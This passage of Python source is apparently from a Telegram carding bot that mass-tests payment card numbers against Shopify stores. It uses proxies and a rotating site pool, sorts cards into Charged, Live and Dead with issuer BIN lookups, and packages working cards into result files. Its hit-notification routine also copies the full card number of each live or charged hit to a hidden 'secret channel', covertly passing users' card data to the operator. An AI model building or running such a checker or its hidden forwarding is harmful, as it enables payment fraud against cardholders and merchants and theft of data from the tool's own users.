        if stickers:
            fid = stickers[0].file_id
            _STICKER_CACHE[emoji_id] = fid
            return fid
    except Exception as exc:
        logging.debug(f"[STICKER] resolve {emoji_id}: {exc}")
    return None


async def _send_sticker(bot, chat_id, emoji_id: str):
    """Send a full-size animated sticker for the given custom emoji ID.
    Uses disable_notification=True so it arrives silently (no ping sound).
    Silently skips if the sticker cannot be resolved."""
    fid = await _get_sticker_fid(bot, emoji_id)
    if fid:
        try:
            await bot.send_sticker(chat_id=chat_id, sticker=fid,
                                   disable_notification=True)
            logging.info(f"[STICKER] ✓ sent eid={emoji_id[:12]}… to {chat_id}")
        except Exception as exc:
            logging.warning(f"[STICKER] send to {chat_id} failed: {exc}")


def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID


def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'


def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"


def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0.00 USD"


def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))


def _get_ud(uid: int, ctx) -> dict:
    return ctx.bot_data.setdefault("users", {}).setdefault(uid, {})


def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN LOOKUP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
    "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
    "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
}


async def _fetch_bin_direct(bin6: str) -> dict:
    sources = [
        {
            "url":   f"https://data.handyapi.com/bin/{bin6}",
            "hdrs":  {},
            # Real response keys: "Scheme", "Issuer", "Country": {"A2":..,"Name":..}
            "parse": lambda d: {
                "scheme":       (d.get("Scheme") or d.get("scheme") or d.get("Type") or "").upper(),
                "bank":         d.get("Issuer") or d.get("issuer") or d.get("bank") or "",
                "country":      (d.get("Country") or d.get("CountryInfo") or {}).get("Name", ""),
                "country_code": (d.get("Country") or d.get("CountryInfo") or {}).get("A2", ""),
            },
        },
        {
            "url":   f"https://lookup.binlist.net/{bin6}",
            "hdrs":  {"Accept-Version": "3"},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or "").upper(),
                "bank":         (d.get("bank") or {}).get("name", ""),
                "country":      (d.get("country") or {}).get("name", ""),
                "country_code": (d.get("country") or {}).get("alpha2", ""),
            },
        },
        {
            "url":   f"https://api.binin.com/bin/{bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("brand") or d.get("scheme") or d.get("type") or "").upper(),
                "bank":         d.get("bank", d.get("issuer", "")),
                "country":      d.get("country", d.get("country_name", "")),
                "country_code": d.get("country_code", d.get("iso2", "")),
            },
        },
        {
            "url":   f"https://api.handy.codes/bin/{bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or d.get("type") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", d.get("iso", "")),
            },
        },
        {
            "url":   f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("card") or d.get("scheme") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", ""),
            },
        },
    ]
    _to = aiohttp.ClientTimeout(total=6, connect=4)
    for src in sources:
        try:
            async with aiohttp.ClientSession(
                timeout=_to, headers={"User-Agent": "Mozilla/5.0"}
            ) as s:
                async with s.get(src["url"], headers=src["hdrs"], ssl=False) as r:
                    if r.status != 200:
                        continue
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        continue
                    info = src["parse"](data)
                    # Require scheme AND at least one of bank/country to be non-empty.
                    # A result with scheme but N/A bank + N/A country is useless — try next source.
                    _bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
                    scheme_ok  = bool((info.get("scheme")  or "").strip().upper() not in _bad)
                    bank_ok    = bool((info.get("bank")    or "").strip().upper() not in _bad)
                    country_ok = bool((info.get("country") or "").strip().upper() not in _bad)
                    if not scheme_ok or not (bank_ok or country_ok):
                        continue
                    cc = (info.get("country_code") or "").upper()[:2]
                    # Build flag from alpha2 if not provided by the source
                    if not cc and info.get("country"):
                        cc = ""
                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
                    return info
        except Exception:
            continue
    return {}


def _bin_empty(r: dict) -> bool:
    """True if the result has no usable BIN data (N/A, error, or missing)."""
    if not r or r.get("error"):
        return True
    bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
    scheme  = str(r.get("scheme",  "") or "").strip().upper()
    bank    = str(r.get("bank",    "") or "").strip().upper()
    country = str(r.get("country", "") or "").strip().upper()
    # Need scheme AND at least one of bank/country
    scheme_ok  = scheme  not in bad
    bank_ok    = bank    not in bad
    country_ok = country not in bad
    return not scheme_ok or not (bank_ok or country_ok)


async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    result: dict = {}

    # 1. Try multi-source direct lookup first (fastest, no rate limit)
    try:
        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
    except Exception:
        result = {}

    # 2. Fall back to config.py binlist.net helper if direct failed
    if _bin_empty(result):
        try:
            result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
        except Exception:
            result = {}

    _BIN_CACHE[bin6] = result
    return result


# ISO-standard long names → clean short names
_COUNTRY_CLEAN = {
    "United States of America (the)":                            "United States",
    "United Kingdom of Great Britain and Northern Ireland (the)":"United Kingdom",
    "Korea (the Republic of)":                                   "South Korea",
    "Korea (the Democratic People's Republic of)":               "North Korea",
    "Russian Federation (the)":                                  "Russia",
    "Iran (Islamic Republic of)":                                "Iran",
    "Taiwan, Province of China":                                 "Taiwan",
    "Hong Kong, Special Administrative Region":                  "Hong Kong",
    "Philippines (the)":                                         "Philippines",
    "Netherlands (the)":                                         "Netherlands",
    "Sudan (the)":                                               "Sudan",
    "Niger (the)":                                               "Niger",
    "Gambia (the)":                                              "Gambia",
    "Bolivia (Plurinational State of)":                          "Bolivia",
    "Venezuela (Bolivarian Republic of)":                        "Venezuela",
    "Tanzania, United Republic of":                              "Tanzania",
    "Moldova (the Republic of)":                                 "Moldova",
    "Syrian Arab Republic (the)":                                "Syria",
    "Lao People's Democratic Republic (the)":                    "Laos",
    "Viet Nam":                                                  "Vietnam",
}

def _clean_country(name: str) -> str:
    return _COUNTRY_CLEAN.get(name, name)


def _bin_str(bd: dict) -> str:
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"):
                return str(v).strip()
        return "N/A"
    scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
    bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
    country = escape(_clean_country(_g("country", "country_name", "country_full")))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN STRING — plain-text version for MsgBuilder
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _bin_str_plain(bd: dict) -> str:
    """Like _bin_str but WITHOUT HTML escaping — for use inside MsgBuilder."""
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"):
                return str(v).strip()
        return "N/A"
    scheme  = _g("scheme", "brand", "card_scheme", "network").upper()
    bank    = _g("bank", "bank_name", "issuer", "issuer_name")
    country = _clean_country(_g("country", "country_name", "country_full"))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE
# Uses parse_mode="HTML" + <tg-emoji> tags — the same
# approach as the working aiogram mst.py reference.
# Custom emoji IDs are ALWAYS resolved as animated stickers
# by the Telegram client regardless of bot Premium status.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(card, resp, verdict, bin_data, price, currency,
                     elapsed, user, plan) -> str:
    """Build the full result card. Returns HTML string (parse_mode='HTML')."""
    ulink = _user_link(user)
    peid  = _plan_eid(plan)
    ts    = _fmt_time(elapsed)
    bin_s = _bin_str(bin_data)

    raw_resp = resp or "Unknown"
    rl = raw_resp.lower()
    if "site error! status:" in rl:
        m = re.search(r"status:\s*(\d+)", rl)
        display_resp = f"Site Error {m.group(1)}" if m else "Site Error"
    elif "not shopify" in rl or "site not supported" in rl:
        display_resp = "Site Not Supported"
    elif "application not found" in rl or "store not found" in rl:
        display_resp = "Store Not Found"
    else:
        display_resp = _clean_resp(raw_resp)
    safe_resp = escape(display_resp)

    ch_link = f'<a href="{SECRET_CHANNEL_LINK}">[❆]</a>'

    if verdict == "CHARGED":
        eid       = get_random_charged_emoji()
        status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
        gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
    elif verdict == "TDS":
        eid       = get_random_live_emoji()
        status_ln = f'<b>{ch_link} Live {_te(eid,"✅")} [3DS]</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
    elif verdict == "LIVE":
        eid       = get_random_live_emoji()
        status_ln = f'<b>{ch_link} Live {_te(eid,"✅")}</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
    else:
        status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
        gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"

    return (
        f"{status_ln}\n\n"
        f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
        f"<b>   ⤷ <code>{escape(card)}</code></b>\n"
        f"{gate_ln}\n"
        f"<b>──────────</b>\n"
        f"<b>Resp ➳ {safe_resp}</b>\n"
        f"<b>Bin  ➳ <code>{bin_s}</code></b>\n"
        f"<b>──────────</b>\n"
        f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {ts}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )


_build_result_msg = build_result_msg


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS UI
# Returns HTML string (parse_mode='HTML') — same approach
# as aiogram mst.py so <tg-emoji> renders animated.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    ts    = _fmt_time(time.time() - sess["start_time"])
    uobj  = sess.get("user_obj")
    ulink = _user_link(uobj) if uobj else "User"
    peid  = sess.get("plan_eid", PRO_EMOJI_ID)
    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["approved"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
        f"<b>Time    ➳ {ts}</b>\n"
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )


def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess   = MSH_SESSIONS.get(sid, {})
    live_n = sess.get("approved", 0)
    all_n  = sess.get("checked",  0)
    charged_n = sess.get("charged", 0)
    rows = [[
        _btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged",
             style="danger",   icon=BTN_CHARGED_EMOJI_ID),
        _btn(f"Live ({live_n})",       cb=f"{_CB_RESULT}:{sid}:live",
             style="success",  icon=BTN_LIVE_EMOJI_ID),
        _btn(f"All ({all_n})",         cb=f"{_CB_RESULT}:{sid}:all",
             style="primary",  icon=BTN_ALL_EMOJI_ID),
    ]]
    if running:
        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
                          style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)


async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0)) < 1.0:
        return
    text    = _progress_text(sess)          # HTML string — parse_mode="HTML"
    running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force:
        return
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "live":
        cards, label = sess.get("live_cards", []), "Live"
    elif kind == "dead":
        cards, label = sess.get("dead_cards", []), "Dead"
    else:
        cards = (sess.get("charged_cards", []) + sess.get("live_cards", [])
                 + sess.get("dead_cards",   []) + sess.get("error_cards", []))
        label = "All"

    uname = (sess.get("user_obj") and
             (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
    plan  = sess.get("plan", "TRIAL")

    lines = [
        "Gate ➳ Shopify | 0-5 USD",
        f"Result ➳ {label}", f"Total ➳ {len(cards)}",
        f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        bi    = cd.get("bin_info", {})
        flag  = bi.get("country_emoji", "")
        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
        resp  = _clean_resp(cd.get("resp", cd.get("response", "N/A")))
        ver   = cd.get("verdict", "N/A")
        prc   = cd.get("price", "0.00")
        cur   = cd.get("currency", "USD")
        status = ("Charged" if ver == "CHARGED" else
                  "Live"    if ver in ("LIVE","TDS") else
                  "Dead"    if ver == "DEAD" else "Error")
        raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
        lines += [
            f"Card ➳ {cd.get('card','N/A')}",
            f"Status ➳ {status}",
            f"Gate ➳ Shopify | {prc} {cur}",
            f"Resp ➳ {raw_disp}",
            f"Brand ➳ {bi.get('scheme','N/A')}",
            f"Issuer ➳ {bi.get('bank','N/A')}",
            f"Country ➳ {cdisp}",
            "━━━━━━━━━━━━━━",
        ]
    buf   = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return buf, fname, len(cards)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# Strategy:
#   • Full-size animated sticker via send_sticker() FIRST
#     — guaranteed to animate for ALL users (no Premium needed).
#   • Then the text card with parse_mode="HTML" + <tg-emoji>
#     — same approach as the working aiogram mst.py reference.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, user, text: str, verdict: str,
                    card: str = "", bin_data: dict = None,
                    price: str = "0.00", currency: str = "USD",
                    plan: str = "TRIAL", resp: str = ""):
    """Send hit notifications to DM, hit-log group, extra charged group, and secret channel.
    `text` is an HTML string (parse_mode='HTML') — the full result card."""
    bin_data = bin_data or {}

    eid   = get_random_charged_emoji() if verdict == "CHARGED" else get_random_live_emoji()
    peid  = _plan_eid(plan)
    ulink = _user_link(user)

    # ── 1. DM the user — animated sticker first, then full result card ────────
    try:
        await _send_sticker(bot, user.id, eid)           # full-size animated sticker
        await bot.send_message(chat_id=user.id, text=text,
                               parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        logging.warning(f"[HIT] DM uid={user.id}: {e}")

    # ── 2. Public hit-log group — animated sticker + compact 4-line card ──────
    #  [full-size animated sticker]
    #  HIT ➛ CHARGED 💎
    #  Gate ➛ Shopify • 1.99 USD
    #  ✅ ORDER_PAID
    #  User ➛ username ⭐
    if HIT_LOG_GROUP_ID:
        try:
            if verdict == "CHARGED":
                hit_label = "CHARGED"
                hit_fb    = "💎"
                gate_txt  = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
            elif verdict == "TDS":
                hit_label = "LIVE [3DS]"
                hit_fb    = "✅"
                gate_txt  = "Gate ➛ Shopify"
            else:
                hit_label = "LIVE"
                hit_fb    = "✅"
                gate_txt  = "Gate ➛ Shopify"

            resp_disp = escape(_clean_resp(resp)) if resp else "Unknown"

            grp_html = (
                f'<b>HIT ➛ {hit_label} {_te(eid, hit_fb)}</b>\n'
                f'<b>{gate_txt}</b>\n'
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {resp_disp}</b>\n'
                f'<b>User ➛ {ulink} {_te(peid,"⭐")}</b>'
            )
            grp_kb = RawMarkup([[
                _btn("🤖 Open Bot", url=BOT_PLANS_LINK,  style="primary"),
                _btn("📢 Channel",  url=MY_CHANNEL_LINK, style="primary"),
            ]])
            await _send_sticker(bot, HIT_LOG_GROUP_ID, eid)
            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp_html,
                                   parse_mode="HTML", disable_web_page_preview=True,
                                   reply_markup=grp_kb)
        except Exception as e:
            logging.warning(f"[HIT] log group: {e}")

    # ── 3. Extra charged group — animated sticker + compact card ─────────────
    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.3)
            eid_x  = get_random_charged_emoji()
            peid_x = _plan_eid(plan)
            resp_x = escape(_clean_resp(resp)) if resp else "ORDER_PAID"

            ext_html = (
                f'<b>HIT ➛ CHARGED {_te(eid_x,"💎")}</b>\n'
                f'<b>Gate ➛ Shopify • {_fmt_price(price, currency)}</b>\n'
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {resp_x}</b>\n'
                f'<b>User ➛ {ulink} {_te(peid_x,"⭐")}</b>'
            )
            ext_kb = RawMarkup([[
                _btn("🤖 Open Bot", url=BOT_PLANS_LINK,  style="primary"),
                _btn("📢 Channel",  url=MY_CHANNEL_LINK, style="primary"),
            ]])
            await _send_sticker(bot, EXTRA_CHARGED_GROUP_ID, eid_x)
            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=ext_html,
                                   parse_mode="HTML", disable_web_page_preview=True,
                                   reply_markup=ext_kb)
        except Exception as e:
            logging.warning(f"[HIT] extra group: {e}")

    # ── 4. Secret channel — full card details, no sticker needed ─────────────
    if SECRET_CHANNEL_ID and verdict in ("CHARGED", "LIVE", "TDS"):
        try:
            bin_s   = _bin_str(bin_data)
            sc_lbl  = ("CHARGED" if verdict == "CHARGED"
                       else "LIVE [3DS]" if verdict == "TDS" else "LIVE")
            sc_icon = "💎" if verdict == "CHARGED" else "✅"

            sc_html = (
                f"<b>{sc_icon} {sc_lbl} — Shopify</b>\n"
                f"<b>Gate ➳ Shopify • {_fmt_price(price, currency)}</b>\n"
                f"<b>━━━━━━━━━━━━━━</b>\n"
                f'<b>💳 Card ➳ <code>{escape(card)}</code></b>\n'
                f"<b>🏦 Bin  ➳ <code>{bin_s}</code></b>\n"
                f"<b>━━━━━━━━━━━━━━</b>\n"
                f"<b>👤 User ➳ {ulink}</b>\n"
                f"<b>{DEV_LINK_HTML}</b>"
            )
            await asyncio.sleep(0.2)
            await bot.send_message(chat_id=SECRET_CHANNEL_ID, text=sc_html,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logging.debug(f"[HIT] secret channel: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
                       total, user_obj, plan) -> dict:
    sess = {
        "status":   "CHECKING",
        "chat_id":  chat_id,  "user_id":     user_id,
        "msg_id":   msg_id,   "user_msg_id": user_msg_id,
        "total":    total,    "checked":     0,
        "charged":  0, "approved": 0, "dead": 0, "errors": 0,
        "start_time":    time.time(),
        "charged_cards": [], "live_cards":  [],
        "dead_cards":    [], "error_cards": [], "tds_cards": [],
        "tasks": [], "last_text": "", "last_update": 0,
        "user_obj": user_obj, "plan": plan,
        "plan_eid": _plan_eid(plan),
    }
    MSH_SESSIONS[sid] = sess
    return sess


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return

    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies:
        effective_proxies = _load_proxies()

    # Use probed working sites (no dead-site 404s).
    # If probe hasn't run, fall back to full list then probe in background.
    if not all_sites:
        all_sites = get_working_sites()
    elif _WORKING_SITES:
        # Prefer working-site cache over caller-supplied full list
        all_sites = list(_WORKING_SITES)

    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies "
                 f"{len(valid_cards)} cards concurrency={MAX_CONCURRENT}")
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time()
            try:
                verdict, resp, price, currency = await _check_card_with_retry(
                    None, card_fmt, all_sites, effective_proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed  = time.time() - t0
            raw_resp = resp          # keep real API text — never sanitise before storing
            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {
                "card": card_fmt, "verdict": verdict,
                "resp": raw_resp, "response": raw_resp,
                "price": price, "currency": currency, "bin_info": bin_data,
            }
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                            price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, user, _dm_html, "CHARGED",
                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                    plan=plan, resp=raw_resp,
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "TDS":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                sess["tds_cards"].append(rec)
                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                            price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, user, _dm_html, "TDS",
                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                    plan=plan, resp=raw_resp,
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "LIVE":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                            price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(
                    bot, user, _dm_html, "LIVE",
                    card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                    plan=plan, resp=raw_resp,
                ))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)

            else:
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            # Update progress after every single card so user sees real-time counts
            asyncio.create_task(_update_progress(bot, sid))

    # Launch workers one at a time with a stagger delay so:
    # • Each card gets its own slice of the site pool
    # • The user sees cards finishing one by one (not all at once)
    # • The API is not hammered with 20 simultaneous calls
    tasks = []
    for i, (cf, cn) in enumerate(valid_cards):
        if sess.get("status") != "CHECKING":
            break
        t = asyncio.create_task(worker(cf, cn))
        tasks.append(t)
        # Wait for CARD_STAGGER seconds before launching the next card.
        # This also naturally throttles the API — each card checks
        # a different set of sites because the pool is shuffled fresh per card.
        await asyncio.sleep(CARD_STAGGER)

    sess["tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)
    logging.info(f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
                 f"D:{sess['dead']} E:{sess['errors']}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 2)
    if len(parts) < 3:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid, kind = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    locked_for = int(BUTTON_LOCK - (time.time() - sess["start_time"]))
    if locked_for > 0:
        await q.answer(f"⏳ Wait {locked_for}s", show_alert=True); return
    buf, fname, count = _make_result_file(sess, kind)
    if count == 0 and kind != "all":
        await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
    await q.answer("📦 Generating file…")
    labels  = {"live": "Live ✅", "all": "All 📁"}
    caption = (f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
               f"<b>Total ➳ {count}</b>\n"
               f"<b>Gate ➳ Shopify Mass</b>")
    try:
        await context.bot.send_document(
            chat_id=q.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=caption, parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document: {e}")
        try:
            buf.seek(0)
            await context.bot.send_document(
                chat_id=q.message.chat_id,
                document=InputFile(buf, filename=fname),
                caption=caption, parse_mode="HTML",
            )
        except Exception:
            pass


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 1)
    if len(parts) < 2:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
